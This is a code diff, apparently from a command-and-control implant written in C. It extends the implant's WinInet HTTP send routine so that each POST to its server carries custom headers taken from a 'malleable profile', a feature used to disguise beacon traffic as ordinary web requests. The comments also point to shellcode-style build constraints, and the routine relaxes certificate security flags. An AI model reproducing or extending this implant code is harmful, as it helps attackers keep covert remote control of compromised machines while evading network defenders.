@@ -46,7 +46,10 @@ DECLFN PVOID Http_Connect( PVOID h_internet, PCHAR host, UINT16 port )
 
 // Send a POST request with 'data' as the body. read the full response into a heap buffer
 // Caller owns the response buffer - must Heap_Free it when done
-DECLFN BOOL Http_Send( PVOID h_connect, PCHAR uri, BOOL use_ssl, PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len )
+DECLFN BOOL Http_Send( PVOID h_connect, PCHAR uri, BOOL use_ssl,
+                       PAIN_HEADER* extra_hdrs, UINT32 extra_hdr_count,
+                       PVOID data, UINT32 data_len,
+                       PVOID* out_buf, UINT32* out_len )
 {
     G_AGENT;
 
@@ -83,10 +86,40 @@ DECLFN BOOL Http_Send( PVOID h_connect, PCHAR uri, BOOL use_ssl, PVOID data, UIN
         Self->WinInet.InternetSetOptionA( h_req, INTERNET_OPTION_SECURITY_FLAGS, &sec, sizeof(sec) );
     }
 
-    BOOL ok =Self->WinInet.HttpSendRequestW(
+    // Build the full header string: base Content-Type + profile custom headers.
+    // Narrow buffer first, then convert to wide for HttpSendRequestW.
+    // Keep buffers small (512) so total stack stays under 4 KB (avoids __chkstk_ms).
+    CHAR  hdr_narrow[512];
+    UINT32 hdr_pos = 0;
+
+    // Base header
+    const CHAR base[] = "Content-Type: application/octet-stream\r\n";
+    for ( UINT32 k = 0; base[k] && hdr_pos < sizeof(hdr_narrow) - 1; k++ )
+        hdr_narrow[hdr_pos++] = base[k];
+
+    // Custom headers from malleable profile
+    for ( UINT32 i = 0; i < extra_hdr_count; i++ ) {
+        PCHAR name = extra_hdrs[i].Name;
+        PCHAR val  = extra_hdrs[i].Value;
+        if ( !name || !val ) continue;
+        // append: "Name: Value\r\n"
+        for ( UINT32 k = 0; name[k] && hdr_pos < sizeof(hdr_narrow) - 5; k++ )
+            hdr_narrow[hdr_pos++] = name[k];
+        if ( hdr_pos < sizeof(hdr_narrow) - 4 ) { hdr_narrow[hdr_pos++] = ':'; hdr_narrow[hdr_pos++] = ' '; }
+        for ( UINT32 k = 0; val[k]  && hdr_pos < sizeof(hdr_narrow) - 3; k++ )
+            hdr_narrow[hdr_pos++] = val[k];
+        if ( hdr_pos < sizeof(hdr_narrow) - 2 ) { hdr_narrow[hdr_pos++] = '\r'; hdr_narrow[hdr_pos++] = '\n'; }
+    }
+    hdr_narrow[hdr_pos] = '\0';
+
+    WCHAR hdr_wide[512];
+    Mem_Set( hdr_wide, 0, sizeof(hdr_wide) );
+    str_to_wide( hdr_wide, hdr_narrow, 512 );
+
+    BOOL ok = Self->WinInet.HttpSendRequestW(
         h_req,
-        L"Content-Type: application/octet-stream\r\n",
-        (DWORD)-1,  // auto-calculate header length from the null terminator
+        hdr_wide,
+        (DWORD)-1,
         data,
         data_len
     );
